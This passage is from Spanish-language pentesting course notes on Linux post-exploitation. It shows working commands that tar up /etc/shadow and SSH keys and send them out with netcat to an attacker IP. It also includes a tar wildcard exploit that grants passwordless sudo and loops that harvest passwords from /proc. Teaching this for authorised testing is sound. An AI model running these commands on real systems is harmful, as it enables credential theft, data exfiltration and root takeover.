usuario@target:~$ grep "Accepted password" /var/log/auth.log

# Comandos ejecutados con sudo:
usuario@target:~$ grep "COMMAND" /var/log/auth.log | tail -20

#### 🗄️ Buscar Strings en Binarios

# Extraer strings de un binario y buscar passwords:
usuario@target:~$ strings /opt/custom_app | grep -i password
default_password=admin123

      📦 Exfiltración de Datos con tar y Compresión

#### Vector de Ataque: Compresión para Exfiltración

Usar `tar` y compresión para empaquetar y exfiltrar datos del sistema comprometido.

#### 📤 Empaquetar Datos Sensibles

# Comprimir directorio completo:
usuario@target:~$ tar -czvf /tmp/data.tar.gz /home/admin/.ssh /var/www/html /etc/shadow 2>/dev/null

# Comprimir múltiples archivos de configuración:
usuario@target:~$ tar -czvf /tmp/configs.tar.gz /etc/passwd /etc/shadow /etc/ssh/sshd_config 2>/dev/null

# Comprimir logs:
usuario@target:~$ tar -czvf /tmp/logs.tar.gz /var/log/auth.log /var/log/syslog 2>/dev/null

# Transferir archivo comprimido a tu máquina:
usuario@target:~$ nc -w 3 10.10.10.5 4444 # En tu Kali: nc -lvnp 4444 > data.tar.gz

#### 🔓 Wildcards en tar (Escalada)

# Si un script de root ejecuta tar con wildcard:
# Script vulnerable:
#!/bin/bash
cd /var/backups
tar -czf backup.tar.gz *

# Explotación creando archivos especiales:
usuario@target:/var/backups$ echo 'echo "usuario ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > shell.sh
usuario@target:/var/backups$ chmod +x shell.sh
usuario@target:/var/backups$ touch ./--checkpoint=1
usuario@target:/var/backups$ touch ./--checkpoint-action=exec=sh\ shell.sh

# Cuando cron ejecute el script, tar interpretará los archivos como opciones:
# tar -czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh
# Y ejecutará shell.sh como root

      ⚙️ Enumeración de Procesos y Credenciales

#### Vector de Ataque: Información en Procesos en Ejecución

Los procesos pueden revelar credenciales en argumentos de comandos, variables de entorno y más.

#### 🔍 Buscar Credenciales en Procesos

# Ver todos los procesos con argumentos completos:
usuario@target:~$ ps aux | grep -v grep
admin     1234  0.0  0.5  mysql -u root -p'SuperSecret123' -h localhost
# ¡Contraseña visible en el comando!

# Ver líneas de comando completas de todos los procesos:
usuario@target:~$ ps -eo user,pid,cmd | grep -i password

# Ver procesos de un usuario específico:
usuario@target:~$ ps -u root -o user,pid,cmd

# Información detallada de procesos en /proc:
usuario@target:~$ for pid in /proc/[0-9]*; do cat $pid/cmdline 2>/dev/null | tr '\0' ' '; echo; done

#### 🌍 Variables de Entorno de Procesos

# Ver variables de entorno de un proceso:
usuario@target:~$ cat /proc/1234/environ | tr '\0' '\n'
PATH=/usr/bin:/bin
API_KEY=sk-1234567890abcdef
DB_PASSWORD=secret123

# Buscar en variables de entorno de todos los procesos:
usuario@target:~$ for pid in /proc/[0-9]*; do cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -i password; done

#### 📂 Archivos Abiertos por Procesos

# Ver archivos abiertos por un proceso:
usuario@target:~$ lsof -p 1234
# Puede revelar archivos de configuración, bases de datos, sockets

# Ver conexiones de red de procesos:
usuario@target:~$ lsof -i
apache2   1234 www-data    4u  IPv4  12345      0t0  TCP *:80 (LISTEN)
mysql     5678 mysql      10u  IPv4  67890      0t0  TCP localhost:3306 (LISTEN)

      📄 Lectura de Archivos Sensibles del Sistema

#### Vector de Ataque: Archivos del Sistema con Información Crítica

Archivos estándar del sistema que contienen información valiosa para reconocimiento y escalada.

#### 👥 Archivos de Usuarios

# Enumerar usuarios del sistema:
usuario@target:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
mysql:x:999:999:MySQL Server:/var/lib/mysql:/bin/false

# Filtrar solo usuarios con shell de login:
usuario@target:~$ cat /etc/passwd | grep -v nologin | grep -v false

# Intentar leer /etc/shadow (solo root puede):
usuario@target:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied

# Pero tal vez haya un backup legible:
usuario@target:~$ cat /etc/shadow- 2>/dev/null
usuario@target:~$ cat /var/backups/shadow.bak 2>/dev/null

#### 🔐 Configuración de sudo

# Ver configuración de sudo:
usuario@target:~$ cat /etc/sudoers 2>/dev/null
usuario@target:~$ cat /etc/sudoers.d/* 2>/dev/null

# Buscar configuraciones inseguras:
usuario@target:~$ grep -r "NOPASSWD" /etc/sudoers* 2>/dev/null
usuario ALL=(ALL) NOPASSWD: /usr/bin/vim

#### 🌐 Configuración de Red

# Hosts conocidos:
usuario@target:~$ cat /etc/hosts
127.0.0.1       localhost
192.168.1.50    database.local
10.0.0.1        internal-api.company.com

# DNS:
usuario@target:~$ cat /etc/resolv.conf

# Configuración de red:
usuario@target:~$ cat /etc/network/interfaces

#### ⏰ Tareas Programadas

# Crontabs del sistema:
usuario@target:~$ cat /etc/crontab
*/5 * * * * root /opt/scripts/backup.sh

# Ver scripts ejecutados por cron:
usuario@target:~$ ls -la /etc/cron.*
usuario@target:~$ cat /etc/cron.d/*

# Verificar permisos del script:
usuario@target:~$ ls -l /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 256 Feb  7 10:00 /opt/scripts/backup.sh
# ¡Escribible por todos! Puedes modificarlo

#### 📊 Información del Kernel

# Versión del kernel:
usuario@target:~$ cat /proc/version
Linux version 4.4.0-31-generic (buildd@lgw01-amd64-051)
# Buscar: "4.4.0-31 exploit" en Google

# Información de CPU:
usuario@target:~$ cat /proc/cpuinfo | grep "model name" | head -1

# Memoria:
usuario@target:~$ cat /proc/meminfo | head -5

  [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux para Pentesting|← Volver al Índice del Curso]]

Módulo - Comandos Básicos de Linux - Curso de Linux para Pentesting

      **Manuel Fernández Ramos** | Versión 202302 v1.0

---

## 🔗 Navegación
* 🐧 [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux para Pentesting|Volver al Portal del Curso de Linux]]
* 🗂️ [[02 - MODULOS/Prácticas (PoCs)/Linux/00 - Índice del Módulo Linux|Índice General de Linux]]
